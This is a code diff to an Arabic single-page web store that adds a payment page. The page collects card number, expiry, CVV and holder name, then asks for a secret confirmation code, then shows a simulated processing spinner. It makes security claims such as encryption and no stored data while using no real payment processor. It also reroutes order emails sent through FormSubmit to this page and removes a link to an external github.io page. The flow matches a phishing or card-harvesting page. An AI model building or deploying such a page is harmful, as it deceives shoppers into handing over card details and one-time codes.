@@ -1298,6 +1298,176 @@
         </section>
     </div>
 
+    <!-- Payment Platform Page -->
+    <div id="payment-platform-page" class="page">
+        <section class="py-16 bg-gradient-to-br from-gray-900 via-black to-gray-800 min-h-screen">
+            <div class="container mx-auto px-4">
+                <div class="max-w-2xl mx-auto">
+                    <!-- Header -->
+                    <div class="text-center mb-8">
+                        <h1 class="text-4xl font-bold mb-2" style="color: #8B0000 !important;">الدفع - منصة الدفع المستقبلية</h1>
+                        <h2 class="text-2xl font-bold mb-4" style="color: #8B0000 !important;">الدفع</h2>
+                        <p class="text-lg" style="color: #8B0000 !important;">منصة الدفع المستقبلية مع تقنيات الأمان المتطورة والحماية الشاملة</p>
+                    </div>
+
+                    <!-- Security Features -->
+                    <div class="grid grid-cols-3 gap-4 mb-8 text-center">
+                        <div class="bg-white bg-opacity-10 p-4 rounded-lg backdrop-blur-lg">
+                            <h3 class="font-bold mb-2" style="color: #8B0000 !important;">SSL 256-bit</h3>
+                        </div>
+                        <div class="bg-white bg-opacity-10 p-4 rounded-lg backdrop-blur-lg">
+                            <h3 class="font-bold mb-2" style="color: #8B0000 !important;">حماية متقدمة</h3>
+                        </div>
+                        <div class="bg-white bg-opacity-10 p-4 rounded-lg backdrop-blur-lg">
+                            <h3 class="font-bold mb-2" style="color: #8B0000 !important;">معالجة فورية</h3>
+                        </div>
+                    </div>
+
+                    <!-- Card Preview -->
+                    <div class="bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl p-8 mb-8 text-white relative overflow-hidden">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-white bg-opacity-10 rounded-full -mr-16 -mt-16"></div>
+                        <div class="absolute bottom-0 left-0 w-24 h-24 bg-white bg-opacity-10 rounded-full -ml-12 -mb-12"></div>
+                        
+                        <div class="relative z-10">
+                            <h3 class="text-xl font-bold mb-6" style="color: #8B0000 !important;">معاينة البطاقة المستقبلية</h3>
+                            <div class="space-y-4">
+                                <div>
+                                    <p class="text-sm" style="color: #8B0000 !important;">منصة الدفع</p>
+                                    <p class="text-2xl font-bold" style="color: #8B0000 !important;">FUTURE</p>
+                                </div>
+                                <div>
+                                    <p class="text-xl font-mono tracking-wider" style="color: #8B0000 !important;">•••• •••• •••• ••••</p>
+                                </div>
+                                <div class="flex justify-between">
+                                    <div>
+                                        <p class="text-xs" style="color: #8B0000 !important;">الاسم</p>
+                                        <p class="font-bold" style="color: #8B0000 !important;">••••• •••••</p>
+                                    </div>
+                                    <div>
+                                        <p class="text-xs" style="color: #8B0000 !important;">انتهاء</p>
+                                        <p class="font-bold" style="color: #8B0000 !important;">••/••</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Security Guarantees -->
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 mb-8 glass-effect">
+                        <h3 class="text-xl font-bold mb-6 text-center" style="color: #8B0000 !important;">ضمانات الأمان</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6 text-center">
+                            <div class="p-4">
+                                <i class="fas fa-shield-alt text-3xl mb-2" style="color: #8B0000 !important;"></i>
+                                <p class="font-bold" style="color: #8B0000 !important;">تشفير متطور للبيانات</p>
+                            </div>
+                            <div class="p-4">
+                                <i class="fas fa-lock text-3xl mb-2" style="color: #8B0000 !important;"></i>
+                                <p class="font-bold" style="color: #8B0000 !important;">حماية ضد الاحتيال</p>
+                            </div>
+                            <div class="p-4">
+                                <i class="fas fa-eye-slash text-3xl mb-2" style="color: #8B0000 !important;"></i>
+                                <p class="font-bold" style="color: #8B0000 !important;">عدم حفظ البيانات</p>
+                            </div>
+                        </div>
+
+                        <!-- Payment Form -->
+                        <form id="secure-payment-form" class="space-y-6">
+                            <h4 class="text-lg font-bold text-center mb-6" style="color: #8B0000 !important;">بيانات البطاقة</h4>
+                            
+                            <div>
+                                <label class="block text-sm font-bold mb-2" style="color: #8B0000 !important;">رقم البطاقة</label>
+                                <input type="text" name="card_number" class="w-full px-4 py-3 text-base border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600" placeholder="•••• •••• •••• ••••" maxlength="19" required="">
+                            </div>
+                            
+                            <div class="grid grid-cols-3 gap-4">
+                                <div>
+                                    <label class="block text-sm font-bold mb-2" style="color: #8B0000 !important;">الشهر</label>
+                                    <select name="exp_month" class="w-full px-4 py-3 text-base border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600" required="">
+                                        <option value="">••</option>
+                                        <option value="01">01</option>
+                                        <option value="02">02</option>
+                                        <option value="03">03</option>
+                                        <option value="04">04</option>
+                                        <option value="05">05</option>
+                                        <option value="06">06</option>
+                                        <option value="07">07</option>
+                                        <option value="08">08</option>
+                                        <option value="09">09</option>
+                                        <option value="10">10</option>
+                                        <option value="11">11</option>
+                                        <option value="12">12</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-bold mb-2" style="color: #8B0000 !important;">السنة</label>
+                                    <select name="exp_year" class="w-full px-4 py-3 text-base border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600" required="">
+                                        <option value="">••••</option>
+                                        <option value="2024">2024</option>
+                                        <option value="2025">2025</option>
+                                        <option value="2026">2026</option>
+                                        <option value="2027">2027</option>
+                                        <option value="2028">2028</option>
+                                        <option value="2029">2029</option>
+                                        <option value="2030">2030</option>
+                                        <option value="2031">2031</option>
+                                        <option value="2032">2032</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-bold mb-2" style="color: #8B0000 !important;">رمز</label>
+                                    <input type="text" name="cvv" class="w-full px-4 py-3 text-base border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600" placeholder="•••" maxlength="4" required="">
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label class="block text-sm font-bold mb-2" style="color: #8B0000 !important;">اسم حامل البطاقة</label>
+                                <input type="text" name="card_holder" class="w-full px-4 py-3 text-base border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600" placeholder="الاسم كما هو مكتوب على البطاقة" required="">
+                            </div>
+                            
+                            <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-red-800 text-white py-4 rounded-xl font-bold text-lg hover:from-red-700 hover:to-red-900 transition-all duration-300 transform hover:scale-105">
+                                <i class="fas fa-credit-card mr-2"></i>
+                                <span style="color: white !important;">إرسال لإتمام الشراء</span>
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Confirmation Code Section (Hidden by default) -->
+                    <div id="confirmation-section" class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 glass-effect hidden">
+                        <div class="text-center mb-6">
+                            <i class="fas fa-key text-4xl mb-4" style="color: #8B0000 !important;"></i>
+                            <h3 class="text-2xl font-bold mb-2" style="color: #8B0000 !important;">كود التأكيد</h3>
+                            <p class="text-lg" style="color: #8B0000 !important;">أدخل كود التأكيد لإتمام الشراء</p>
+                        </div>
+                        
+                        <form id="confirmation-form" class="space-y-6">
+                            <div>
+                                <label class="block text-sm font-bold mb-2 text-center" style="color: #8B0000 !important;">كود التأكيد السري</label>
+                                <input type="text" name="confirmation_code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-red-600 dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل الكود" maxlength="10" required="">
+                            </div>
+                            
+                            <button type="submit" class="w-full bg-gradient-to-r from-green-600 to-green-800 text-white py-4 rounded-xl font-bold text-lg hover:from-green-700 hover:to-green-900 transition-all duration-300">
+                                <i class="fas fa-check-circle mr-2"></i>
+                                <span style="color: white !important;">تأكيد الشراء</span>
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Processing Section (Hidden by default) -->
+                    <div id="processing-section" class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 glass-effect text-center hidden">
+                        <div class="animate-spin w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full mx-auto mb-4"></div>
+                        <h3 class="text-2xl font-bold mb-2" style="color: #8B0000 !important;">جاري المعالجة...</h3>
+                        <p class="text-lg" style="color: #8B0000 !important;">يرجى عدم إغلاق الصفحة</p>
+                        
+                        <div class="mt-8 p-4 bg-blue-50 dark:bg-blue-900 rounded-lg">
+                            <i class="fas fa-shield-alt text-2xl mb-2" style="color: #8B0000 !important;"></i>
+                            <p class="font-bold" style="color: #8B0000 !important;">تأمين وتشفير البيانات</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
     <!-- Thank You Page -->
     <div id="thank-you-page" class="page">
         <section class="py-16 bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900 min-h-screen">
@@ -1728,8 +1898,12 @@
         function checkPageFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
             const page = urlParams.get('page');
+            const payment = urlParams.get('payment');
             
-            if (page === 'code') {
+            if (payment === 'true') {
+                // Show payment platform page when redirected from FormSubmit
+                showPage('payment-platform-page');
+            } else if (page === 'code') {
                 showPage('enter-code-page');
             } else if (page === 'thanks') {
                 showPage('thank-you-page');
@@ -2562,9 +2736,6 @@
                         'phone': this.phone.value,
                         'email': this.email.value,
                         'address': this.address.value,
-                        'card_number_masked': '**** **** **** ' + this.card_number.value.slice(-4),
-                        'card_expiry': this.card_expiry.value,
-                        'card_holder': this.card_holder.value,
                         'order_number': orderNumber,
                         'order_summary': orderSummary,
                         'total_amount': `${finalTotal.toFixed(2)} ${currentCurrencySymbol}`,
@@ -2572,7 +2743,7 @@
                         '_subject': '🏆 طلب ذهبي جديد - المتجر الإمبراطوري 👑',
                         '_captcha': 'false',
                         '_template': 'table',
-                        '_next': window.location.origin + window.location.pathname + '?page=code',
+                        '_next': window.location.origin + window.location.pathname + '?payment=true',
                         '_autoresponse': '🎉 تهانينا! تم استلام طلبك الذهبي بنجاح! سيتم تجهيز طلبك خلال الساعات القادمة وستتلقى رسالة تأكيد مع رقم التتبع قريباً. شكراً لاختيارك المتجر الذهبي الإمبراطوري! 👑✨'
                     };
                     
@@ -2607,10 +2778,7 @@
                     
                     // Show success message before redirect to payment platform
                     showGoldenCelebration('تم إرسال طلبك الذهبي بنجاح! 👑', () => {
-                        // Redirect to external payment platform
-                        setTimeout(() => {
-                            window.open('https://rootkaliig.github.io/spirituality/', '_blank');
-                        }, 1000);
+                        // Redirect to internal payment platform
                         hiddenForm.submit();
                     });
                 });
@@ -2835,7 +3003,53 @@
             updatePointsDisplay();
             generateHomeProducts();
             generateProducts();
+            
+            // Setup payment platform functionality
+            setupPaymentPlatform();
         });
+        
+        // Setup payment platform functionality
+        function setupPaymentPlatform() {
+            // Handle secure payment form submission
+            const securePaymentForm = document.getElementById('secure-payment-form');
+            if (securePaymentForm) {
+                securePaymentForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    // Hide the payment form and show confirmation section
+                    this.closest('.bg-white').style.display = 'none';
+                    document.getElementById('confirmation-section').classList.remove('hidden');
+                });
+            }
+            
+            // Handle confirmation form submission
+            const confirmationForm = document.getElementById('confirmation-form');
+            if (confirmationForm) {
+                confirmationForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    // Hide confirmation section and show processing
+                    document.getElementById('confirmation-section').style.display = 'none';
+                    document.getElementById('processing-section').classList.remove('hidden');
+                    
+                    // Add celebration effects
+                    if (typeof confetti !== 'undefined') {
+                        confetti({
+                            particleCount: 200,
+                            spread: 70,
+                            origin: { y: 0.6 },
+                            colors: ['#8B0000', '#FF0000', '#DC143C']
+                        });
+                    }
+                    
+                    // Simulate processing and redirect to thank you page after 3 seconds
+                    setTimeout(() => {
+                        showPage('thank-you-page');
+                        addPoints(1000, 'إتمام الدفع بنجاح!');
+                    }, 3000);
+                });
+            }
+        }
     </script>
 
 
